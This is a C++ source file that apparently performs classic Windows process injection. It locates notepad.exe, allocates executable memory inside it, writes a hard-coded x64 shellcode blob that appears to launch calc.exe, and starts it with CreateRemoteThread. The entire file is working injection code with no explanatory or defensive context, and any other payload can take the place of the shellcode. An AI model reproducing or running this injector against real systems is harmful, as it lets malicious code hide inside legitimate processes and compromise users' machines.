#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>

const char* procName = "notepad.exe";
const char* shellcode = "\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2\x48\x83\xec\x20\x41\xff\xd6";

DWORD getProcId(const char* procName) {
	DWORD procId = 0;
	HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnap != INVALID_HANDLE_VALUE) {
		PROCESSENTRY32 procEntry;
		procEntry.dwSize = sizeof(procEntry);

		if (Process32First(hSnap, &procEntry)) {
			do {
				if (!_stricmp(procEntry.szExeFile, procName)) {
					procId = procEntry.th32ProcessID;
					break;
				}

			} while(Process32Next(hSnap, &procEntry));

		}
	}
	CloseHandle(hSnap);
	return procId;
}

DWORD proc_Injector(DWORD procId) {
	void* mem_loc;

	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, 0, procId);
	if (hProcess != INVALID_HANDLE_VALUE) {
		mem_loc = VirtualAllocEx(hProcess, NULL, MAX_PATH, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		
		if (mem_loc!=0) {
			WriteProcessMemory(hProcess, mem_loc, shellcode, strlen(shellcode) + 1, 0);
			HANDLE hThread=CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE) mem_loc,NULL, 0,NULL);

			if (hThread) {
				CloseHandle(hThread);
			}
		}
		else {
			printf("[!] Unsuccessful Memory Allocation\n");
			exit(-1);
		}


	}
	else {
		printf("[!] Unable to Open Process\n");
		exit(-1);

	}
	if (hProcess) {
		CloseHandle(hProcess);
	}
}

int main() {
	DWORD procId = getProcId(procName);
	if (procId != 0) {
		proc_Injector(procId);

	}
	else {
		printf("[!] Notepad.exe not running\n");
		exit(-1);
	}
}
